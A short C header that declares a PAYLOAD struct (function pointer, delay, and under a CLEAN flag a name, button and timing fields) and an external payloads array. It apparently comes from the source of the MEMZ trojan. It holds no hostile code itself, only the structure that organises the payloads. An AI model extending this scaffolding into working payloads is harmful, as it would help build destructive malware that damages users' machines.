#pragma once
#include "memz.h"

typedef struct {
	int(*payloadFunction)(int, int);
#ifdef CLEAN
	wchar_t *name;
	HWND btn;
	int delay, times, runtime;
#else
	int delay;
#endif
} PAYLOAD;

#ifdef CLEAN
extern PAYLOAD payloads[];
#else
extern const PAYLOAD payloads[];
#endif
extern const size_t nPayloads;